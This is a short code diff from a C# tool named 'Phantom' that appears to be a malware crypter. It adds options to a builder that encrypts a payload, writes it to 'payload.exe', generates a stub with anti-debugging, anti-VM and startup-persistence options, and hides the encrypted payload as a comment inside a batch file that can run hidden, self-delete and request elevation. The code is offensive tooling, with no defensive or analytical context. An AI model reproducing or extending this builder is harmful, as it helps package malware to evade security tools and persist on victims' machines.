@@ -16,7 +16,7 @@ namespace Phantom
             Console.WriteLine("[*] " + msg);
         }
 
-        internal static void Build(string inputPath, string outputPath)
+        internal static void Build(string inputPath, string outputPath, bool hidden, bool selfdelete, bool runas, bool startup, bool antidebug, bool antivm)
         {
             Random rng = new Random();
 
@@ -87,7 +87,7 @@ namespace Phantom
 
             // Generate and compile C# stub
             Log("Creating stub...");
-            string stub = StubGen.CreateCS(_stubkey, _stubiv, mode, true, true, true, !isnetasm, rng);
+            string stub = StubGen.CreateCS(_stubkey, _stubiv, mode, antidebug, antivm, startup, !isnetasm, rng);
 
             string tempfile = CreateTempFile(rng);
             File.WriteAllBytes("payload.exe", payload_enc);
@@ -125,7 +125,7 @@ namespace Phantom
 
             // Generate batch file
             Log("Creating batch file...");
-            string content = FileGen.CreateBat(_key, _iv, mode, true, true, true, fileType, rng);
+            string content = FileGen.CreateBat(_key, _iv, mode, hidden, selfdelete, runas, fileType, rng);
 
             // Insert encrypted payload as comment line
             List<string> content_lines = new List<string>(content.Split(new string[] { Environment.NewLine }, StringSplitOptions.None));
